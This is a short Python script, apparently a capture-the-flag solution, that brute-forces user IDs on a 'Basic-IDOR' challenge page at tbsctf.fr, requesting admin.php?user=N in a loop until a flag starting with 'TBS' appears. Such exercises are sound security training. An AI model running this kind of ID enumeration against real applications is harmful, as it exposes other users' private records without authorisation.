@@ -1,0 +1,15 @@
+import requests
+
+
+test = True
+compteur = 1
+while test : 
+  r = requests.get('http://tbsctf.fr/web/Basic-IDOR/admin.php?user=' + str(compteur))
+  print('http://tbsctf.fr/web/Basic-IDOR/admin.php?user=' + str(compteur))
+  compteur += 1 
+  if 'TBS' in r.text:
+    test = False
+    print("TBS trouvé")
+    
+
+
